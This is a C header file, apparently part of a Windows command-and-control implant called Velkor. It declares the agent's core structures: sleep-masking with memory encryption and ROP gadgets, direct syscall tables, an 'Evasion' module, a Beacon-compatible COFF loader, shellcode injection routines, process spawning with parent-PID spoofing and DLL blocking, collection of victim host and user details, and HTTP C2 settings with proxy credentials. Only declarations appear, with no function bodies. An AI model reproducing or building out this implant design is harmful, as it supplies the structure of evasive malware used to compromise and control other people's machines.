#ifndef VELKOR_H
#define VELKOR_H

#include <windows.h>
#include <iphlpapi.h>
#include <wininet.h>
#ifdef WINHTTP
#include <winhttp.h>
#endif
#include <stdio.h>
#include <ws2spi.h>

#include <Native.h>
#include <Misc.h>
#include <Ground.h>
#include <Evasion.h>
#include <Defines.h>
#include <Communication.h>

/*==============[ Main Export ]==============*/

INT Main(
    PVOID Parameter
);

/*==============[ Velkor struct/enum ]==============*/

typedef struct {
    PVOID SystemFunction041;
    PVOID SystemFunction040;
    PVOID NtTestAlert;
    PVOID VirtualProtect;
    PVOID RtlExitUserThread;
    PVOID RtlFillMemory;
    PVOID NtWaitForSingleObject;
    PVOID WaitForSingleObjectEx;
    PVOID NtGetContextThread;
    PVOID NtSetContextThread;
    PVOID RtlCaptureContext;
    PVOID SetEvent;
    PVOID LoadLibraryA;
    D_API( printf );
    D_API( strncmp );
    D_API( RtlAllocateHeap );
    D_API( NtProtectVirtualMemory );
} API;

typedef struct {
    PVOID  Start;
    UINT64 Length;
} MEM_RANGE, *PMEM_RANGE;

typedef struct {
    PPACKAGE Package;
    PWSTR    Host;
    WORD     Port;
    PWSTR    UserAgent;
    PWSTR    AddHeaders;
    PWSTR    ProxyServers;
    PWSTR    ProxyUserName;
    PWSTR    ProxyPassword;
    BOOL     Secure;
} WEB_INFO, *PWEB_INFO;

struct {
    UINT64 a;
    UINT16 b;
} FODSAS;

typedef struct {
    MEM_RANGE ComputerName;
    MEM_RANGE UserName;
    MEM_RANGE DomainName;
    MEM_RANGE NetBios;
    MEM_RANGE IpAddress;
    MEM_RANGE ProcessorName;
    ULONG     NumberOfProcessors;
    ULONG     TotalRam;
    ULONG     AvalRam;
    ULONG     UsedRam;
    ULONG     UsagePercent;
    ULONG     OsArch;
    ULONG     OsMajorV;
    ULONG     OsMinorV;
    ULONG     ProductType;
    ULONG     OsBuildNumber;
} SYS_INFO, *PSYS_INFO;

typedef struct {
    ULONG SleepTime;
    ULONG Jitter;
    ULONG SleepMask;
    PVOID JmpGadget;
    PVOID NtContinueGadget;
} SLEEP_CONF;

typedef struct {
    UINT32   AgentId;
    eSYSCALL SyscallMethod = VkCallWinApi;
    PWSTR    ProcessName;
    PWSTR    ProcessFullPath;
    PWSTR    CommandLine;
    ULONG    ProcessId;
    ULONG    ThreadId;
    ULONG    ParentProcessId;
    ULONG    ProcessArch;
    ULONG    Protected;
    BOOL     Elevated;
    BOOL     Connected;
} SESSION, *PSESSION;

typedef struct {
    WEB_INFO    WebConfig;
    PPACKAGE    PackagePtr;
} COMM_CONF, *PCOMM_CONF;

typedef struct {
    MEM_RANGE Full;
    MEM_RANGE RxPage;
    MEM_RANGE RwPage;
} MEM_VELKOR, *PMEM_VELKOR;

typedef struct {
    API        FunctionPtr;
    PVOID      Module[M_ENUM_SIZE];
    VK_SYSCALL VkSyscall[SYS_ENUM_SIZE];
} VK_WIN32, *PVK_WIN32;

enum {
    PsSpawn,
    PsTarget
} PS_TYPE;

typedef struct {
    PSTR   ProcessName;
    PSTR   CurrentDir;
    ULONG  ParentPid;
    HANDLE ParentHandle;
    BOOL   BlockDlls;
} PS_SPAWN, *PPS_SPAWN;

typedef struct {
    ULONG  ProcessId;
    HANDLE ProcessHandle;
} PS_TARGET, *PPS_TARGET;

typedef struct {
    ULONG     Type;
    PS_SPAWN  Spawn;
    PS_TARGET Target;
} PS_CTX, *PPS_CTX;

typedef struct {
    ULONG BeaconXprName;
    PVOID BeaconApiPtr;
} BEACON_API, *PBEACON_API;

typedef struct {
    COFF_DATA   Data;
    BEACON_API  BeaconApi[COFF_LEN];
    BOOL        VehEnabled;
} COFF_CTX, *PCOFF_CTX;

typedef BOOL ( *SC_RUN )( HANDLE ProcessHandle, PBYTE ShellcodeBuffer, PSIZE_T ShellcodeSize, PVOID Parameter, BOOL PostEx );

typedef struct {
    PEX_ARGS Args;
    SC_RUN   ScRun[SC_INJ_T_LEN];
    ULONG    PeTechnique;
    ULONG    CoffTechnique;
} INJ_CTX, *PINJ_CTX;

typedef struct {
    PS_CTX   ProcessCtx;
    COFF_CTX zCoffCtx;
    INJ_CTX  InjectionCtx;
} POST_EX, *PPOST_EX;

typedef struct {
    TASK_MGMT   TaskManager[TASK_LENGTH];
    VK_WIN32    VkWin32;
    SLEEP_CONF  SleepConfig;
    POST_EX     PostEx;
    MEM_VELKOR  VelkorMemory;
    SESSION     Session;
    SYS_INFO    System;
    COMM_CONF   CommunicConfig;
    PTEB        Teb;
} VELKOR, *PVELKOR;

#endif // VELKOR_H